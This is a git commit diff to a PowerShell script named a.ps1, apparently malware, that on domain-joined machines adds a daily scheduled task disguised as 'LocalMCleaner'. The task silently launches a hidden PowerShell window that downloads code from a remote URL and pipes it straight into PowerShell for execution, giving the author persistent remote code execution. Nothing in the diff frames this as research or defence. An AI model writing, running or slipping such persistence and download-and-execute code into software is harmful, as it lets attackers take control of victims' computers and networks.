852858219f8e14f910a38d438b1fde7a5f87a619
joes233f <beej0e92@outlook.com>
2024-08-27 15:19:11 +0800

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -10,7 +10,9 @@ if ($computerInfo.CsPartOfDomain)
         $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
     } catch { 
     }  
-
+    $ccc = '"Powershell -WindowStyle Hidden irm '  + $url +'|Powershell"'
+    $str = "schtasks.exe /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 11:30 /f"
+    iex  $str
 } 
 else
 {  
